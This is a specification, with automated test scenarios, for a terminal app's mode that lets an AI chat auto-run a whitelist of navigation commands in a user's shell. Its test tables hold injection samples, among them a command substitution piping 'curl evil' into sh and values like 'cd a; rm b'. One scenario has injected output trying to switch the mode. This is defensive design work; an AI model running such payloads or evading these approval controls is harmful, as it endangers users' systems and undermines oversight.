# Pane Execution Specification

## Purpose

Defines what a chat in `run` mode may type AND execute in the user's shell pane (a small, strictly checked set of navigation commands), and how a bounded, untrusted result goes back to the model. Everything outside this set keeps the pane-commands behaviour: typed with `y`, never executed by lazarobox. Builds on agent-tools (Chat approval mode, Tool output is untrusted data) and pane-commands (validation, rechecks, bracketed paste). Tags: [auto] = automated test, [manual, Kitty] = manual check.

Terms. The safe list is `cd`, `pwd`, `ls`, `tree`, `mkdir`. A command is runnable when the grammar, the flag allow-list and the path policy all accept it. The prompt route is the normal approval of pane-commands, in which `y` types the command and sends no Enter. Fail closed: every case that cannot be checked MUST become the prompt route or a refusal, never a run.

## Requirements

### Requirement: Run routing
In `run` mode a `run_in_pane` call MUST be written and executed without a prompt only when ALL of these hold: the command is runnable; the target is the default target pane (last focused shell pane of the chat's tab, no cycling); the pane is not marked dirty, line pending or executing; the pane does not have the focus; the chat's tab is the shown tab and is not zoomed onto another pane; the pane's real cwd is known; fewer than 5 commands (typed or run, one shared named constant `MAX_AUTO_PER_TURN`) were issued in this turn; the run is not paused (see below); and no other approval is pending. Routing is one pure decision, made at ask time and again after the path check. The path check and the write add two more conditions (see Path policy and Enter in the same write): the shell's real cwd still equals the checked cwd at the write, and the pane's foreground process is its shell at the write; an unknown or busy foreground MUST open the prompt, never run. A run reserves its slot in the per-turn count when it is routed, and a later fallback MUST NOT refund it. Any other case MUST open the normal prompt (never `denied` for these reasons), naming the reason in the prompt (for a grammar or policy fallback, the offending token and why it is not run directly), except the existing refusals that stay `denied` (pending approval: `another approval is pending`; no shell pane or an update pane; alternate screen or closed pane; command validation failure). A command outside the safe list MUST take the prompt route; `y` there types it and MUST NOT send Enter. Refusal pause: after 3 consecutive grammar or policy fallbacks in `run` (`MAX_RUN_FALLBACKS`), every later call in the same turn MUST open the prompt with the reason `auto-run paused for this turn`; the counter resets at the start of each turn and after each completed run. Fallbacks for focus, hidden tab, dirty line, executing mark or the per-turn cap do not count. The mode MUST NOT be changeable by the model: no tool call, tool result, MCP result or pane output can switch it, and the mode is never sent to any engine.

#### Scenario: Safe command runs without y or Enter [auto]
- GIVEN a chat in `run`, shell pane 2 idle at an empty prompt, unfocused, in the shown tab, cwd known
- WHEN the model calls `run_in_pane` with `cd ~/dev/curso-rust`
- THEN no prompt opens and exactly one write reaches pane 2: the command bytes followed by `\r`

#### Scenario: Off-list command prompts and y does not press Enter [auto]
- GIVEN a chat in `run` and a call with `git status`
- WHEN the call is dispatched, and then `y` is pressed
- THEN the normal prompt opens, nothing is written before `y`, and the single write after `y` holds the command with no `\r` or trailing `\n`

#### Scenario: Focused pane prompts [auto]
- GIVEN a chat in `run` whose target pane has the focus
- WHEN the model calls `run_in_pane` with `pwd`
- THEN the normal prompt opens and nothing is written

#### Scenario: Hidden or zoomed tab prompts [auto]
- GIVEN a chat in `run` whose tab is not shown, and in another run a tab zoomed onto another pane
- WHEN the model calls `run_in_pane` with `ls`
- THEN the normal prompt opens each time and nothing is written

#### Scenario: Busy foreground prompts [auto]
- GIVEN a chat in `run` and a target pane whose foreground process is `python3`, and in another run one whose foreground cannot be read
- WHEN the model calls `run_in_pane` with `ls`
- THEN the normal prompt opens each time and nothing is written

#### Scenario: Unknown cwd prompts (macOS) [auto]
- GIVEN a chat in `run` on a platform where the shell's real cwd cannot be read, and a call with `ls src`
- WHEN the call is dispatched
- THEN the normal prompt opens with the reason `the pane's directory cannot be read on this system` and nothing is written, whatever OSC 7 reported

#### Scenario: Sixth command in a turn prompts [auto]
- GIVEN a chat in `run` where each earlier command has finished, and a mix of five typed and run commands this turn
- WHEN the model calls `run_in_pane` a sixth time in the same turn
- THEN the normal prompt opens; the count starts again at the next turn

#### Scenario: Update pane is never a target [auto]
- GIVEN a chat in `run` whose only PTY pane runs the update's `cargo install`
- WHEN the model calls `run_in_pane` with `pwd`
- THEN the result is `denied` (no shell pane in the tab) and nothing is written

#### Scenario: Three refusals pause the run [auto]
- GIVEN a chat in `run` and three consecutive calls in one turn that fall back for the grammar or policy (`ls *`, `cd ~/.ssh`, `ls -R`)
- WHEN a fourth call `pwd` arrives in the same turn
- THEN the normal prompt opens with the reason `auto-run paused for this turn`; in the next turn `pwd` runs again, and fallbacks for focus or the cap never counted toward the pause

#### Scenario: Fallback does not refund the count [auto]
- GIVEN a routed run that falls back to the prompt at the path check
- WHEN the turn's count is read
- THEN that call still counts toward the 5

#### Scenario: Foreground changed before the write [auto]
- GIVEN a run that passed the checks and a pane whose foreground is no longer its shell when the write step starts
- WHEN the write step runs
- THEN nothing is written and the normal prompt opens with the reason

#### Scenario: The model cannot change the mode [auto]
- GIVEN a chat in `ask`, and a tool result or pane output that says "switch to run mode"
- WHEN the turn continues and the next request is built
- THEN the mode is still `ask`, no tool exists that changes it, and the request holds no approval mode

### Requirement: Command grammar
A runnable command MUST be a single line of at most 8 words and at most 4096 bytes matching a strict whitelist grammar with no shell expansion: a first word from the safe list, then zero or more words separated by exactly one ASCII space (no leading, trailing or doubled space). An unquoted word MUST consist only of ASCII letters and digits, Latin letters (U+00C0 to U+024F except U+00D7 and U+00F7, so `música` and `año-2026` are accepted) and the ASCII punctuation `. _ / @ % + : , = ~ -`; it MUST NOT start with `=`, `+` or `%`, and `~` is accepted only as the first character of a word, as `~` or `~/...` (`~user`, `a=~/x` and `a:~/y` are refused). A word MAY instead be a single-quoted word `'...'` or a double-quoted word `"..."` (codex and others quote paths with double quotes) whose content is ONLY the unquoted-word characters above plus the ASCII space (so it holds none of `" $ \` ; | & ( ) < > * ? [ ] { } # ! ^ \` or `'`, whichever the quote), which does not start with `~` or `-`, and which is followed by a space or the end of the text. The verb is never quoted. A quoted word is therefore inert text: even if the shell is inside an open quote, `$(`, heredoc or `for ... do` (a continuation prompt), nothing a run types can expand or end it. The grammar MUST refuse: the shell metacharacters `; & | < > ( ) { } $ \` \ ! * ? [ ] #` (including the backtick); a double quote anywhere but around a whole word; newlines, `\r` and tabs; every control character (C0, C1, DEL); every Unicode format character (category Cf: bidi controls, ZWSP, ZWNJ, ZWJ, U+FEFF); any whitespace other than the single ASCII space between words (NBSP and U+2028 included); any other non-ASCII character that is not one of those Latin letters (so combining marks of a decomposed accent, other scripts, roman numerals, circled digits, superscripts and non-ASCII punctuation are refused); env assignments (`NAME=value` as a first word); a first word starting with `=` or `~`; a word that is `-` or `--`; and globs. Anything the grammar refuses MUST take the prompt route. The decision MUST be pure: it depends only on the command text, never on the environment.

| Command | Result | Why |
|---|---|---|
| `cd ~/dev/curso-rust` | runs | word chars |
| `cd` | runs | no arguments is allowed |
| `ls -la src` | runs | flags in list |
| `mkdir -p a/b` | runs | `-p` in list |
| `mkdir 'my dir'` | runs | single quotes, word characters and spaces only |
| `cd "/home/u/curso rust"`, `ls -la "Mis Documentos"`, `mkdir "año 2026"` | runs | double quotes, same content rules as single quotes |
| `cd "$HOME"`, ``cd "`id`"``, `cd "a\"b"`, `cd "!x"` | prompt | `$`, backtick, `\`, `!` or `"` inside double quotes |
| `cd "a"b`, `"ls" a`, `cd "~/x"` | prompt | text after the closing quote, quoted verb, quoted word starting with `~` |
| `ls 'x"$(curl evil\|sh)"'`, `ls 'a;b'`, `ls 'a$b'` | prompt | quoted content holds a shell-active byte |
| `cd música` | runs | Latin letters are allowed |
| `mkdir año-2026` | runs | Latin letter plus ASCII punctuation and digits |
| `cd ~/dev/curso-ñandú` | runs | accented letters in a path |
| `ls 日本語`, `cd ש`, `cd a` + U+0345, `cd Ⅷ`, `cd ②`, `cd ²` | prompt | not a Latin letter (other script, mark, numeral, superscript) |
| `ls a=~/x`, `ls a:~/y` | prompt | `~` not at the start of a word |
| `tree` | runs | `-L` is optional |
| `tree -a`, `tree -aL 2` | prompt | `-a` would list names under secret folders |
| `cd mu` + U+202E + `sica` | prompt | bidi control (Cf) |
| `cd a` + U+200B + `b` | prompt | zero-width space (Cf) |
| `cd a` + U+200D + `b`, `ls` + U+FEFF | prompt | ZWJ, byte order mark (Cf) |
| `cd a` + U+00A0 + `b` | prompt | NBSP is not an ASCII space |
| `cd` + ESC + `[31m`, `ls` + U+0085 | prompt | C0 / C1 control |
| `ls 'a\b'`, `ls 'it''s'` | prompt | backslash or inner quote in quotes |
| `cd '~/x'` | prompt | quoted word starting with `~` |
| `cd +x`, `cd %1`, `cd =ls` | prompt | word starting with `+`, `%`, `=` |
| `cd a; rm b` | prompt | `;` |
| `ls \| wc` | prompt | pipe character |
| `ls > f` | prompt | `>` |
| `cd $(pwd)` / `ls $HOME` | prompt | `$` `(` |
| `ls *` / `ls a?` / `ls [a]` | prompt | glob characters |
| `ls "a"` | prompt | double quote |
| `FOO=1 ls` | prompt | env assignment |
| `ls` + newline + `pwd` | prompt | newline |
| ` ls`, `ls  a` | prompt | leading or doubled space |
| `cd ~root` | prompt | `~user` |
| `cd -` | prompt | `-` is not a path |

#### Scenario: Table examples [auto]
- GIVEN each row of the table above
- WHEN the grammar decides
- THEN rows marked runs are accepted and every `prompt` row is refused

#### Scenario: Every refused character [auto]
- GIVEN `ls x`, and `ls 'x`+char+`'`, with each of `; & | < > ( ) { } $ \` \ ! * ? [ ] # ^` (backtick included), a double quote, `\n`, `\r`, `\t`, ESC, U+0085, U+200B, U+200D, U+202E, U+FEFF and U+00A0 appended to the word
- WHEN the grammar decides on each
- THEN each is refused and routes to the prompt

#### Scenario: Latin letters are accepted [auto]
- GIVEN `cd música`, `mkdir año-2026`, `cd øåæłőž` and `cd ~/dev/curso-ñandú`
- WHEN the grammar decides
- THEN each is accepted and the text is unchanged byte for byte

#### Scenario: Limits [auto]
- GIVEN a command of 9 words, one of more than 4096 bytes, and `ls` followed by two spaces
- WHEN the grammar decides
- THEN each is refused and routes to the prompt

#### Scenario: Refusal is a prompt, not a denial [auto]
- GIVEN a chat in `run` and the call `ls *`
- WHEN it is dispatched
- THEN the normal prompt opens with the exact text `ls *`, nothing is written, and the result is not `denied`

### Requirement: Flag allow-lists
Each safe-list command MUST accept only its own flags; any other flag, any long flag (`--x`), a bare `--` and an unknown combination MUST take the prompt route. Short flags MAY be clustered (`-la`) only when every letter is allowed.

| Command | Allowed flags | Notes |
|---|---|---|
| `cd` | none | zero or one path argument |
| `pwd` | none | no arguments |
| `ls` | `-l -a -h -1 -t -r` | zero to 4 paths; never `-R` |
| `tree` | `-d`, and optionally `-L <n>` | `-L` is optional; when given it needs a separate word of 1 or 2 digits; zero or one path; never `-o` |
| `mkdir` | `-p` | 1 to 4 paths; never `-m` |

Any word starting with `-` is treated as a flag. `tree` without `-L` runs directly, bounded only by the output cap and the timeout.

#### Scenario: Allowed flags run [auto]
- GIVEN `ls -la`, `ls -1t -r src`, `tree`, `tree -d`, `tree -L 2 -d`, `mkdir -p a/b` and `pwd`
- WHEN the grammar and flags are checked
- THEN each is runnable

#### Scenario: Unlisted flags prompt [auto]
- GIVEN `ls -R`, `ls -lR`, `ls --all`, `tree -o out.txt`, `tree -L`, `tree -L x`, `tree -L 123`, `mkdir -m 777 x`, `mkdir` (no path), `cd a b`, `pwd x`, `cd -P x`, `pwd -P` and `ls -- -x`
- WHEN each is checked
- THEN each takes the prompt route and nothing is written

### Requirement: Path policy against the real cwd
Every path argument MUST be resolved against the shell's real current directory, read from the operating system at write time (never from the chat's origin cwd, and never from OSC 7, which any program can print), with `~`, `.` and `..` resolved (so `cd ..` is allowed, not refused) and symlinks followed, and checked with the path policy of agent-tools (secret and credential directories and files) both lexically and on the real path. `cd` and `mkdir` MUST NEVER target or enter a secret or credential directory; `ls` and `tree` MUST NOT list one. `cd` and `ls` MUST NOT be limited to `$HOME`: paths outside it are allowed unless they fall under a secret root (a link that resolves into a secret root is refused). `tree`, including its implicit cwd, MUST stay inside `$HOME` (S5b). For `mkdir`, whose target does not exist yet, the policy MUST be applied to the deepest existing ancestor (canonicalized) plus the remaining names, and every `mkdir` target MUST be inside `$HOME`. For every verb except `cd`, the shell's cwd itself MUST pass the policy too, because `ls` and `tree` without arguments, `pwd` and a relative `mkdir` act on it. A path that cannot be resolved for `cd`, `ls` or `tree`, a secret-root list that cannot be loaded, any case where the real cwd cannot be read (macOS always), and a check that takes more than 2 s, MUST take the prompt route. The disk is never touched on the UI loop. The cwd MUST be compared again at write time against the checked cwd, and a mismatch MUST win (prompt). Known residual risk: a shell with `$CDPATH` or `cdable_vars` may resolve a bare relative `cd name` somewhere other than the checked directory; the command is not rewritten (checked bytes == written bytes), so this is accepted and documented.

#### Scenario: Secret directories never run [auto]
- GIVEN a chat in `run` and cwd `/home/u`
- WHEN the model calls `cd ~/.ssh`, `mkdir ~/.aws/x`, `ls .gnupg` and `tree ~/.config/gcloud`
- THEN each takes the prompt route and nothing is written

#### Scenario: Relative path judged by the real cwd [auto]
- GIVEN the shell's real cwd is `/home/u/.ssh` while the chat was opened in `/home/u/dev`
- WHEN the model calls `ls keys`
- THEN the path is resolved under `/home/u/.ssh`, the call takes the prompt route and nothing is written

#### Scenario: Dot-dot and symlink escape [auto]
- GIVEN cwd `/home/u/dev` and a symlink `dev/s` pointing at `/home/u/.ssh`
- WHEN the model calls `cd s` and `cd ../.ssh`
- THEN both take the prompt route

#### Scenario: Cd dot-dot is resolved, not refused [auto]
- GIVEN cwd `/home/u/dev/curso` and `/home/u/dev` is not a secret location
- WHEN the model calls `cd ..`
- THEN the command runs

#### Scenario: Mkdir only inside home [auto]
- GIVEN cwd `/home/u`
- WHEN the model calls `mkdir -p dev/x`, `mkdir /tmp/x` and `mkdir /srv/data/x`
- THEN the first runs and the other two take the prompt route

#### Scenario: Cwd itself must pass for ls and tree [auto]
- GIVEN the shell's real cwd is `/home/u/.ssh`
- WHEN the model calls `ls`, `tree`, `pwd` and `mkdir x`
- THEN each takes the prompt route

#### Scenario: Secret roots unavailable [auto]
- GIVEN the list of secret roots cannot be loaded
- WHEN the model calls `ls`
- THEN the normal prompt opens and nothing is written

#### Scenario: Outside home is allowed [auto]
- GIVEN cwd `/home/u` and `/srv/data` exists and is not a secret location
- WHEN the model calls `cd /srv/data`
- THEN the command runs

#### Scenario: Cwd read fails at write time [auto]
- GIVEN a command that passed the first check and a real cwd that cannot be read when the write happens
- WHEN the write is attempted
- THEN nothing is written and the normal prompt opens

#### Scenario: Cwd changed between check and write [auto]
- GIVEN `ls keys` approved for `/home/u/dev` and the shell now in `/home/u/.ssh`
- WHEN the write step re-checks
- THEN nothing is written and the normal prompt opens

### Requirement: Byte-for-byte what was checked
The exact string that passed the grammar, flags and path checks MUST be the string written to the pane, with no normalization (trimming, quoting, expansion, case folding or path rewriting) between validation and the write. The tool call row and the result row (and, for `cd`, the system line) MUST show that same exact command. The validated text MUST NOT contain ESC or the paste end marker (existing command validation).

#### Scenario: Same bytes [auto]
- GIVEN the runnable command `ls -la ~/dev`
- WHEN it is written
- THEN the bytes before the `\r` equal the UTF-8 of the command exactly, and the call row and the result row show `ls -la ~/dev`

#### Scenario: No silent cleanup [auto]
- GIVEN a command with a trailing space or a doubled space
- WHEN it is dispatched in `run`
- THEN it is not cleaned into a runnable command: it takes the prompt route and shows the text unchanged

### Requirement: Enter in the same write
A run MUST be exactly one PTY write holding the command bytes followed by `\r`: after the end marker when the pane has bracketed paste enabled, after the plain text when it does not. `\r` MUST be appended only for a run decision made under this capability; the prompt route, `y`, and `auto` MUST NEVER append it. The existing recheck set (validation, pane exists, shell pane of the chat's tab, not on the alternate screen, bracketed paste state read at the write) MUST run before the write.

#### Scenario: Plain write [auto]
- GIVEN bracketed paste disabled and the runnable command `pwd`
- WHEN it is run
- THEN one WritePty carries exactly `pwd\r`

#### Scenario: Framed write [auto]
- GIVEN bracketed paste enabled and `ls -l`
- WHEN it is run
- THEN one WritePty carries ESC[200~, `ls -l`, ESC[201~, then `\r`, and nothing else

#### Scenario: Auto and y never send Enter [auto]
- GIVEN a chat in `auto` with `cd x`, and a chat in `run` with an off-list command accepted with `y`
- WHEN each is written
- THEN neither write contains `\r`

#### Scenario: Cancelled before the write [auto]
- GIVEN a run whose turn ended or was cancelled before the write
- WHEN the write step starts
- THEN no byte is written (the answer is claimed before the write)

### Requirement: Dirty-line guard
Each shell pane MUST carry a `dirty` mark set by every key, paste or wheel write lazarobox forwards to it. Only Enter and Ctrl+C clear it. Ctrl+U MUST NOT clear it (a shell may kill only the text left of the cursor, so text to the right would still be on the line and the run would execute it). Up and Tab count as dirty. A bare Enter clears the mark only if the previous key forwarded to that pane was not Tab, BackTab or an arrow key: after those a completion menu (zsh menu-select, the fish pager) may be open and Enter only accepts an entry, leaving the line in place, so the pane stays dirty until the next bare Enter or Ctrl+C (cost: after Up and Enter one run prompts; accepted). Ctrl+U still clears the line-pending mark of agent-tools. A pane marked dirty MUST NOT receive a run: the call takes the prompt route. A command typed with `y` or in `auto` leaves the pane marked line pending (existing behaviour), which also blocks a run. The mark belongs to one pane and is dropped when the pane closes.

#### Scenario: Half-typed line prompts [auto]
- GIVEN the user typed `rm -rf ` into pane 2 and has not pressed Enter
- WHEN the model calls `run_in_pane` with `cd x` in `run`
- THEN the normal prompt opens, nothing is written, and the line never executes

#### Scenario: Clearing keys [auto]
- GIVEN pane 2 marked dirty
- WHEN the user sends Enter, and in another run Ctrl+C
- THEN the mark clears each time and the next safe command runs without a prompt

#### Scenario: Ctrl+U does not clear dirty [auto]
- GIVEN pane 2 marked dirty (the user typed `ls x` and moved the cursor left of leftover text)
- WHEN the user sends Ctrl+U to pane 2
- THEN the pane stays dirty, the line-pending mark (if any) clears, and the next `run_in_pane` call for pane 2 opens the normal prompt and writes nothing

#### Scenario: Wheel and paste are dirty [auto]
- GIVEN a clean pane 2
- WHEN the user pastes text into it, and in another run the wheel is forwarded to it
- THEN a following safe command takes the prompt route each time

#### Scenario: History recall and Tab are dirty [auto]
- GIVEN a clean pane 2
- WHEN the user presses Up, and in another run Tab, in pane 2
- THEN a following safe command takes the prompt route each time

#### Scenario: Marks are per pane [auto]
- GIVEN pane 2 dirty and pane 3 clean
- WHEN the target is pane 3
- THEN the command runs, and closing pane 2 removes its mark

### Requirement: Executing mark
From the write until the capture ends, the pane MUST be marked executing. A call to a pane marked executing (including a second call in the same batch) MUST take the prompt route. The mark MUST clear when the run settles, times out, is cancelled, aborts, or the pane closes.

#### Scenario: Batched second call prompts [auto]
- GIVEN a run of `ls` in flight on pane 2
- WHEN the model's second call `pwd` for pane 2 arrives in the same batch
- THEN the normal prompt opens and nothing is written

#### Scenario: Mark released [auto]
- GIVEN an executing mark and a run that settles
- WHEN a later safe command targets pane 2
- THEN it runs without a prompt

### Requirement: Settle and timeout
After the write the call MUST stay pending until the run ends. The pane is probed on the existing 16 ms tick, only while a run is in flight. The run ends, checked in this order: (1) the pane enters the alternate screen (`full-screen`), or the user sends a key to the pane during the run (`user typed`); (2) 10 s have passed since the write (`timed out`); (3) it settles, which requires ALL of: the pane's foreground process is its shell (an unknown foreground keeps waiting, never settles), at least 250 ms have passed since the later of the write and the last output, and progress was seen: the cursor is on a later line than at the write (the prompt line moved), OR the shell's real cwd differs from the cwd at the write, OR the line generation changed (the lines are then not comparable and the output is `not available`). A silent successful command (for example `mkdir -p x`) MUST therefore settle about 250 ms after the prompt returns, not at the timeout. A timed-out run returns `still running` with the output so far and releases the mark. No result MUST claim an exit status. Turn-level timers are paused while the call is pending, as for approvals.

#### Scenario: Silent mkdir settles promptly [auto]
- GIVEN `mkdir -p a/b` run in pane 2 that prints nothing and returns to the prompt on a new line
- WHEN the quiet time passes
- THEN the run settles as `ran` (empty body) about 250 ms after the prompt returned, well before the 10 s timeout

#### Scenario: cd settles on the cwd change [auto]
- GIVEN `cd ~/dev/curso-rust` run in pane 2
- WHEN the shell's cwd changes and 250 ms pass without output
- THEN the run settles as `ran`

#### Scenario: Unknown foreground never settles [auto]
- GIVEN a run whose pane foreground cannot be read
- WHEN 250 ms pass with the cursor on a later line
- THEN the run does not settle and ends at the 10 s timeout

#### Scenario: User types during a run [auto]
- GIVEN a run in flight
- WHEN the user sends a key to the pane
- THEN the run ends (`the user typed in the pane`), no screen text is read and the executing mark clears

#### Scenario: Generation change settles without text [auto]
- GIVEN a run in flight and a resize that bumps the line generation
- WHEN 250 ms pass with the shell in the foreground
- THEN the run settles with `output not available`

#### Scenario: Slow output times out [auto]
- GIVEN `ls -l` in a directory whose output keeps arriving, or a shell that never returns to the foreground state
- WHEN the 10 s timeout passes
- THEN the result says the command is still running after 10 s, with the output so far, and the executing mark clears

#### Scenario: No exit status [auto]
- GIVEN any settled or timed-out run
- WHEN the result text is built
- THEN it states that the exit status is not known and makes no claim of success or failure

### Requirement: Output capture bounds, redaction and nonce
For `ran` and `still running` results the app MUST read the pane's screen text between an anchor recorded at the write (the stable cursor line plus the line generation) and the prompt line, trim blank edges, and process it as a tool result: output cleaned with the output sanitizer, capped at 8 KiB and at most 200 lines (the first 100 and the last 100 lines, cut on character boundaries) with the marker `[… N lines not shown …]`, the command-echo rows skipped, up to 2 prompt-decoration lines above the new prompt trimmed, secrets redacted, then wrapped in the untrusted-data nonce wrapper. The output MUST go to the model for every engine, cloud engines included. If the line generation changed (resize, eviction, screen switch) the result MUST say `output not available` and carry no text. A silent command returns an empty body with its status.

#### Scenario: Bounded head and tail [auto]
- GIVEN `ls` printing 1,000 lines
- WHEN the result is built
- THEN it holds at most 200 lines and 8 KiB (100 head, 100 tail), and the marker `[… 800 lines not shown …]` sits between them

#### Scenario: Redaction and wrapper [auto]
- GIVEN output containing a token-like secret, a closing-wrapper forgery and an escape sequence
- WHEN the result is built
- THEN the secret is redacted, no control character remains, and the content sits wholly inside the nonce wrapper

#### Scenario: Cloud engines receive it [auto]
- GIVEN a cloud engine and a settled run
- WHEN the result is returned
- THEN the bounded wrapped output is sent without a further approval

#### Scenario: Generation change [auto]
- GIVEN the pane was resized between the write and the settle
- WHEN the result is built
- THEN it reads `output not available`, with no screen text

#### Scenario: Multi-line prompt decoration trimmed [auto]
- GIVEN a shell with a two-line prompt
- WHEN the output is read
- THEN prompt lines and blank edges are not part of the body

### Requirement: cd reports the authoritative cwd
A settled `cd` MUST return the shell's new real cwd, read from the operating system, falling back to OSC 7 (labelled as such) only when the real cwd cannot be read; if neither is known the result MUST say the cwd is unknown. When the shell's cwd after a `cd` is not the requested target (an alias or function), the result MUST report the actual cwd and say it differs from the target. After a `cd` run the transcript MUST get a system line `pane N: <exact command> → <cwd>`. Other commands add no such system line. The cwd is sanitized like any tool text.

#### Scenario: New cwd named [auto]
- GIVEN `cd ~/dev/curso-rust` run and settled
- WHEN the result is built
- THEN it names `/home/u/dev/curso-rust` as the cwd and a system line shows the command and that cwd

#### Scenario: OSC 7 fallback [auto]
- GIVEN the real cwd cannot be read after the write but OSC 7 reported a directory
- WHEN the result is built
- THEN the cwd comes from OSC 7

#### Scenario: Unknown cwd [auto]
- GIVEN neither source is available
- WHEN the result is built
- THEN it says the cwd is unknown and names no path

#### Scenario: Cd target mismatch [auto]
- GIVEN `cd proyectos` run where a shell function leaves the shell in `/home/u/other`
- WHEN the result is built
- THEN it names `/home/u/other` as the actual cwd and says it is not the requested target

### Requirement: Alternate screen during capture
If the target pane enters the alternate screen while a run is being captured, the run MUST end: the result says the command ran and opened a full-screen program, carries no screen text (`no output was read`), and the executing mark clears.

#### Scenario: Pager opens [auto]
- GIVEN a run in flight and the pane processes `ESC[?1049h`
- WHEN the next poll happens
- THEN the call ends with the abort reason, no text is returned and the mark is cleared

### Requirement: Result contract
Every `run_in_pane` call MUST end with exactly one result whose text tells what actually happened: `Ran in pane N. cwd: <path>. Exit status is not known.` with the bounded wrapped output or `(no output)` (settled); `Ran in pane N; still running after 10 s. Output so far:` and the wrapped output (timed out); `Ran in pane N; its output is not available.` (generation changed or no nonce available); `Ran in pane N; it opened a full-screen program` or `the user typed in the pane`, `so no output was read.`; `typed into pane N — no Enter` (prompt route accepted with `y`, and `auto`); or `denied` with a short reason. The tool description MUST be neutral and identical in every mode and for every engine (pinned by design: per the user's settings a command is only typed or typed and run, the result says which, and only simple commands such as cd, pwd, ls, tree and mkdir with a few flags can run directly). The result row MUST start with the exact command and then say `ran in pane N` plus the cwd, the line count, `still running` or `output not available`. With tools off, every adapter request MUST be byte-identical to the one built without tools, whatever the mode.

#### Scenario: Ran result [auto]
- GIVEN a settled `ls -l`
- WHEN the result row and the tool result are built
- THEN the row starts with the exact command `ls -l` and reads `ran in pane N`, and the tool result holds `Ran in pane N. cwd: <path>.` and the bounded wrapped body

#### Scenario: Typed result unchanged [auto]
- GIVEN an off-list command accepted with `y`
- WHEN the write completes
- THEN the result is `typed into pane N — no Enter`

#### Scenario: Same request in every mode [auto]
- GIVEN tools on
- WHEN the request is built for chats in `ask`, `auto` and `run`
- THEN the three are byte-identical, tool description included

#### Scenario: Tools off is byte-identical [auto]
- GIVEN tools off and `approval = "run"`
- WHEN requests are built for every adapter and the chat is rendered
- THEN each request equals the one without tools and no RUN marker or tool row appears

### Requirement: Cancel and turn end
Cancelling the call, cancelling the stream, closing the chat pane, turning tools off or ending the turn while a run is captured MUST drop the capture, clear the executing mark and send nothing further to the model for that call. A command already written is not undone and is not interrupted by lazarobox.

#### Scenario: Cancel drops the capture [auto]
- GIVEN a run in flight and a stream cancel
- WHEN the cancel is processed
- THEN the capture is dropped, the mark clears, no result text is produced and no further byte is written

#### Scenario: Pane closed mid-run [auto]
- GIVEN a run in flight and the target pane closes
- WHEN the close is processed
- THEN the call ends with a short reason (`pane closed`), the mark is gone and late events are ignored

### Requirement: Real shells
The behaviour above MUST hold on bash, zsh and fish.

#### Scenario: Go to a directory [manual, Kitty]
- GIVEN `run` on, an idle empty prompt in bash, zsh and fish
- WHEN the model is asked to take the user to `~/dev/curso-rust`
- THEN the pane ends in that directory with no `y` and no Enter, the RUN marker is visible, and the model's answer names the new cwd

#### Scenario: Refused things never run [manual, Kitty]
- GIVEN `run` on
- WHEN the model is made to call `ls -R`, `tree -o f`, `cd ~/.ssh`, `mkdir ~/.aws/x`, `ls *` and `cd x; rm y`
- THEN each opens the normal prompt and nothing runs

## Notes: accepted residual risks (continuation prompts)

The premise "checked bytes are the executed bytes" holds when the shell is at a primary prompt. Enter clears the dirty mark, but the shell may still be at a continuation prompt (PS2). Two measures close the model-crafted ways to get there: the quoted-word rule above (a run's words are inert even inside an open quote, `$(` or heredoc, and the trailing `\r` just continues PS2), and `validate`, which refuses model text with an unbalanced single or double quote or a trailing unescaped backslash, so `y` and `auto` cannot open a continuation. `validate` also refuses model text that ends (after trailing blanks) with `&&`, `||`, `|` or `\`, or that holds an unescaped backtick, `$(` or `<<`, each with its own denied reason. Residual, accepted and documented: a user-typed trailing `&&`, `||`, `|`, `do` or `then` lets a later run complete the user's own line; a trailing `\` the user typed, or an open construct the user later closes, can merge a run's inert words into the user's own command. OSC 133 prompt detection is the future fix. Terminal query replies (DA1, DSR) written to the pane do not mark it dirty: their content is fixed and not chosen by an attacker, and marking them would stop `run` for prompts that query the terminal.
